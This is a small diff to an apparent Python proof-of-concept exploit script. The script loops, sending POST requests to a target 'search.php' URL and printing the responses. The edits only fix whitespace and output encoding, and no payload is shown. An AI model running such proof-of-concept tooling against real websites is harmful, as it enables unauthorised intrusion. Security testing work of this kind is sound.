@@ -7,7 +7,7 @@ def poc():
 		if  not target.url.endswith("search.php"):
 			print("[*] Please make sure the url end with 'search.php'")
 			exit()
-			
+
 		flag = 1
 		while flag:
 			try:
@@ -26,7 +26,7 @@ def poc():
 					}
 
 					r = requests.post(target.url,data=postdata)
-					print r.text[:r.text.find("<!DOCTYPE html>")]
+					print r.text[:r.text.find("<!DOCTYPE html>")].encode(r.encoding)
 				else:
 					flag = 0
 			except EOFError as e:
